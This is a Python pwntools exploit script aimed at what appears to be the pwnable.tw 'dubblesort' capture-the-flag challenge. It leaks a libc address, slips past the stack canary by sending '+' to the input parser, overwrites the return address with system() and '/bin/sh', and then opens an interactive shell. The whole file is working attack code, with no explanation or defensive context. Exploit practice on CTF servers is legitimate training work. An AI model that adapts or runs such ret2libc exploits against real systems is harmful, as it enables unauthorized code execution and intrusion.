#!/usr/bin/env python3

import pwn

rem = pwn.remote('chall.pwnable.tw', 10101)
libc = pwn.ELF('./libc_32.so.6')
rem.recvuntil(':')

rem.sendline('A' * 24)
rem.recvline()
libc_leak = b'\x00' + rem.recvuntil(':')[0:3]
libc_leak = pwn.u32(libc_leak)

leak_offset = libc.get_section_by_name('.got.plt').header.sh_addr
libc_base = libc_leak - leak_offset
system_addr = libc_base + libc.symbols[b'system']
bin_sh_addr = libc_base + list(libc.search(b'/bin/sh\x00'))[0]

num = 35
rem.sendline(str(num))

# 24 zeros
for _ in range(24):
	rem.recvuntil(': ')
	rem.sendline('0')

# canary
rem.recvuntil(': ')
rem.sendline('+')

# system address
for _ in range(8):
	rem.recvuntil(': ')
	rem.sendline(str(system_addr))

# /bin/sh
for _ in range(2):
	rem.recvuntil(': ')
	rem.sendline(str(bin_sh_addr))

rem.recvuntil(':')
rem.interactive()
